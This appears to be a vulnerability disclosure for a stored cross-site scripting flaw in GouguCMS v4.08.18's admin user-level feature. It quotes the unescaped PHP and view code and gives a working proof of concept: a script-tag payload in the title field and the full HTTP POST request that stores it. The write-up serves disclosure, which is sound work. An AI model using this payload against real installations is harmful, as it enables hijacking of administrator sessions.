# The GouguCMS V4.08.18 version has a stored cross-site scripting (XSS) vulnerability in the user level function.

## Introduction to Vulnerabilities

In the user level function of GouguCMS v4.08.18, there is a stored cross-site\
scripting vulnerability. An authenticated administrator can inject HTML or\
JavaScript through the `title` parameter. The value is stored in\
`cms_user_level.title` and is rendered as HTML in the administrator user-level\
list.

## Vulnerability Analysis

The vulnerable file is `app/admin/controller/Level.php`.

The `title` parameter is obtained by the controller and only has spaces\
removed before it is validated and written to the database.

```php
$param['title'] = preg_replace('# #', '', $param['title']);
validate(LevelCheck::class)->scene('add')->check($param);
$mid = Db::name('UserLevel')->strict(false)->field(true)->insertGetId($param);
```

`app/admin/validate/LevelCheck.php` only checks whether the value is present\
and unique. It does not reject HTML or JavaScript.

```php
protected $rule = [
    'title' => 'require|unique:user_level',
    'id'    => 'require',
];
```

The user-level list API returns the stored value without output encoding.

```php
public function index()
{
    if (request()->isAjax()) {
        $level = Db::name('UserLevel')->select();
        return to_assign(0, '', $level);
    }

    return view();
}
```

Finally, `app/admin/view/level/index.html` renders `title` as a normal Layui\
table field.

```javascript
{ field: 'title', title: '等级名称', width: 120, align: 'center' }
```

No escape function or output encoding is used, so the stored markup is\
interpreted by the browser.

## Vulnerability verification

The function requires an authenticated administrator account. Log in to the\
backend and open:

```text
System Management -> User Level
```

<br />

<img width="2560" height="1528" alt="image1" src="https://github.com/user-attachments/assets/31bc2e19-e422-4d04-aba2-1cdaf1bcb621" />


Add or edit a user level and set the level name to:

```html
<script>alert("gougucms")</script>
```

<br />

<img width="2549" height="1391" alt="image2" src="https://github.com/user-attachments/assets/b0a7d84b-8dab-4a70-a29e-8e70ef457fe4" />


Corresponding data packet:

```http
POST /admin/level/add HTTP/1.1
Host: ip:port
Cookie: PHPSESSID=<ADMIN_SESSION>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://ip:port

id=0&title=%3Cscript%3Ealert(%22gougucms%22)%3C%2Fscript%3E&desc=xss
```

After the level is saved, reload or reopen the user-level list. The stored\
JavaScript is loaded from the list API and executed in the administrator\
browser.

<br />

<img width="1741" height="447" alt="image3" src="https://github.com/user-attachments/assets/e096887d-269f-4f1f-a597-f815ef052fcf" />


The same value is also returned as `level_name` by `/admin/user/index` and\
rendered in the user list.

